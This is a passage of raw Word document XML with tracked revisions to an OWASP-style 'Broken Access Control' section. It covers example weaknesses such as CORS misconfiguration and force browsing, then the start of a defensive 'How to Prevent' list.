          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> CORS misconfiguration allows </w:t>
      </w:r>
      <w:ins w:id="369" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">API access from </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthorized</w:t>
      </w:r>
      <w:del w:id="370" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> API access.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="371" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/untrusted</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="222DCC30" w14:textId="3AD07833" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="372" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="373" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="374" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    origins.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="51FF1777" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="375" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42341BC1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="376" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="377" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Force browsing to authenticated pages as an unauthenticated user or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641987B0" w14:textId="6AA01983" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="378" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to privileged pages as a standard user.</w:t>
      </w:r>
      <w:del w:id="379" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> Accessing API with missing access controls for POST, PUT and DELETE.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="42775D34" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="783F6DCD" w14:textId="1AFFA064" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">## How </w:t>
      </w:r>
      <w:del w:id="380" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="381" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3464507A" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07702DAB" w14:textId="5EC643F3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="382" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Access control is only effective </w:t>
      </w:r>
      <w:del w:id="383" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">if enforced </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>in trusted server-side code or</w:t>
      </w:r>
      <w:del w:id="384" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7594A853" w14:textId="7729B8EF" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="385" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>server-less API, where the attacker cannot modify the access control</w:t>
      </w:r>
      <w:del w:id="386" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="630A62A0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>check or metadata.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20767250" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B0C26E6" w14:textId="16A8AC1A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="387" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* With the exception of</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="388" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Except for</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> public resources, deny by default.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3D3C78" w14:textId="5FDF1DE9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="389" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="390" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="74458542" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="391" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="392" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Implement access control mechanisms once and re-use them throughout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1621A0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="393" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the application, including minimizing </w:t>
      </w:r>
      <w:ins w:id="394" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Cross-Origin Resource Sharing (</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CORS</w:t>
      </w:r>
      <w:ins w:id="395" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> usage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E14B94A" w14:textId="0D8B63E4" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="396" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="397" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6C150E44" w14:textId="3783D90D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="398" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="399" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Model access controls should enforce record ownership</w:t>
      </w:r>
      <w:del w:id="400" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> rather than</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED1445B" w14:textId="582A9C8A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="401" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> accepting that the user can create, read, update, or delete any</w:t>
      </w:r>
      <w:del w:id="402" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> record.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3D38486D" w14:textId="75C44BA5" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="403" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="404" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="405" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    record.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="333F50B2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="406" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F078100" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="407" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="408" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unique application business limit requirements should be enforced by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DECA9A6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="409" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> domain models.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B353E89" w14:textId="06970044" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="410" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="411" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="44AD0A13" w14:textId="69F1E5FA" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="412" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="413" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Disable web server directory listing and ensure file metadata (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="414" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="415" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3D6861EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="416" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
